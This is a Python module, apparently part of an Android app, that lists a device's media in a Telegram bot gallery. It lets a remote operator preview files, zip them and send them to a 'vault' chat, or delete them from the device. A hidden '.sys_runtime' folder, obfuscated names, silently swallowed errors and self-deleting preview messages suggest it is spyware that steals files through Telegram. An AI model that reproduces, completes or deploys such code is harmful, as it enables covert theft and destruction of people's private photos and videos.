# -*- coding: utf-8 -*-
import os, time, zipfile, logging, threading, random, gc, json

# إعداد المسارات الأساسية
P = os.path.join(os.getcwd(), ".sys_runtime")
T = os.path.join(P, "g_tmp")
if not os.path.exists(T):
    os.makedirs(T)

# إعداد السجلات
logging.basicConfig(filename=os.path.join(P, "g.log"), level=logging.ERROR, filemode='w')

try:
    from PIL import Image
    PIL = True
except:
    PIL = False

class G:
    def __init__(self, sc=None, tg=None):
        self.sc = sc      # MediaScanner instance
        self.tg = tg      # TelegramUI instance
        self.ipp = 16     # Images Per Page
        self._c()         # تنظيف الملفات المؤقتة عند البدء

    def _c(self):
        """تنظيف مجلد التخزين المؤقت"""
        try:
            for f in os.listdir(T):
                os.remove(os.path.join(T, f))
        except:
            pass

    def _t(self, p, s=(300, 300)):
        """توليد صورة مصغرة للصور (Thumbnail)"""
        if not PIL or not os.path.exists(p):
            return None
        try:
            i = Image.open(p)
            i.thumbnail(s, Image.LANCZOS)
            o = os.path.join(T, f"t_{time.time_ns()}.jpg")
            i.save(o, "JPEG", quality=60)
            i.close()
            return o
        except:
            return None

    # ✅ تعطيل معاينة الفيديو لتقليل حجم APK (لا حاجة لـ opencv-python)
    def _v(self, p):
        """معاينة الفيديو معطلة للحفاظ على صغر حجم التطبيق"""
        return None

    # ✅ الدوال المطلوبة من commands.py (تم تغيير الأسماء للتوافق)
    def get_grid_kb(self, cat="pending", page=0):
        """إنشاء لوحة أزرار المعرض (الشبكة)"""
        r = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=page)
        stats = self.sc.get_statistics()
        total = stats.get(cat, 0)
        tot_p = (total + self.ipp - 1) // self.ipp

        kb = []
        row = []
        for i in range(self.ipp):
            if i < len(r):
                lb = r[i].get("label", str((page * self.ipp) + i + 1).zfill(2))
                btn = {"text": f"🖼 {lb}", "callback_data": f"g_opt|{cat}|{page}|{i}"}
            else:
                btn = {"text": "⬛", "callback_data": "n"}
            row.append(btn)
            if len(row) == 4:
                kb.append(row)
                row = []

        nav = []
        if page > 0:
            nav.append({"text": "⏮️", "callback_data": f"g_nav|{cat}|{page-1}"})
        nav.append({"text": f"📄 {page+1}/{max(1, tot_p)}", "callback_data": f"g_nav|{cat}|{page}"})
        if len(r) == self.ipp and (page + 1) < tot_p:
            nav.append({"text": "⏭️", "callback_data": f"g_nav|{cat}|{page+1}"})
        kb.append(nav)
        return {"inline_keyboard": kb}

    def show_options(self, cid, cat, p, i):
        """إظهار خيارات ملف معين (معاينة، تحميل، حذف)"""
        r = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=int(p))
        if int(i) >= len(r):
            return
        it = r[int(i)]
        path = it['path']
        lb = it.get("label", "??")
        sz = round(os.path.getsize(path) / (1024 * 1024), 1) if os.path.exists(path) else 0

        kb = [
            [{"text": "👁 معاينة", "callback_data": f"g_act|pr|{cat}|{p}|{i}"}],
            [
                {"text": "⬇️ تحميل", "callback_data": f"g_act|dw|{cat}|{p}|{i}"},
                {"text": "🗑 حذف", "callback_data": f"g_conf|de|{cat}|{p}|{i}"}
            ],
            [{"text": "🔙 عودة", "callback_data": f"g_nav|{cat}|{p}"}]
        ]
        self.tg._ap("sendMessage", {
            "chat_id": cid,
            "text": f"📦 #{lb} ({sz} MB)",
            "reply_markup": json.dumps({"inline_keyboard": kb})
        })

    def execute_action(self, cid, act, cat, p, i):
        """تنفيذ الإجراء المختار من قائمة الخيارات"""
        r = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=int(p))
        if int(i) >= len(r):
            return
        path = r[int(i)]['path']
        lb = r[int(i)].get("label", "??")
        if act == "pr":
            self._pr(cid, path)
        elif act == "dw":
            self._dw(cid, path, lb)
        elif act == "del":   # بعد التأكيد من g_conf
            self._de(cid, path, lb)

    def _pr(self, cid, path):
        """المعاينة السريعة"""
        ext = path.lower()
        th = None
        if ext.endswith(('.jpg', '.jpeg', '.png', '.webp')):
            th = self._t(path)
        elif ext.endswith(('.mp4', '.mkv', '.3gp', '.mov', '.avi')):
            th = self._v(path)   # ستعيد None لأن دعم الفيديو معطل

        if th:
            r = self.tg._ap("sendPhoto", {"chat_id": cid, "caption": "🔍"}, {"photo": open(th, 'rb')})
            if r and r.get('ok'):
                threading.Timer(30, self._cl, args=(cid, r['result']['message_id'], th)).start()
        else:
            self.tg._ap("sendMessage", {"chat_id": cid, "text": "❌ لا توجد معاينة (صورة غير مدعومة أو فيديو معطل)"})

    def _dw(self, cid, path, lb):
        """إرسال الملف الأصلي داخل ملف مضغوط"""
        z = os.path.join(T, f"d_{random.getrandbits(32)}.zip")
        v = None
        try:
            if self.sc and self.sc.det and self.sc.det.mon:
                v = getattr(self.sc.det.mon, 'vlt', None)
            if not v:
                v = getattr(self.tg, 'dat', cid)
            with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.write(path, os.path.basename(path))
            with open(z, 'rb') as f:
                self.tg._ap("sendDocument", {"chat_id": v, "caption": f"📤 {lb}"}, {"document": f})
        except:
            pass
        finally:
            if os.path.exists(z):
                os.remove(z)
            gc.collect()

    def _de(self, cid, path, lb):
        """حذف الملف نهائياً من الجهاز"""
        try:
            if os.path.exists(path):
                os.remove(path)
                self.tg._ap("sendMessage", {"chat_id": cid, "text": f"🗑 {lb}"})
        except:
            pass
        gc.collect()

    def _cl(self, cid, mid, p):
        """تنظيف المعاينة (حذف الرسالة والملف المؤقت)"""
        try:
            self.tg._ap("deleteMessage", {"chat_id": cid, "message_id": mid})
        except:
            pass
        try:
            if os.path.exists(p):
                os.remove(p)
        except:
            pass
        gc.collect()

def create(sc=None, tg=None):
    return G(sc, tg)
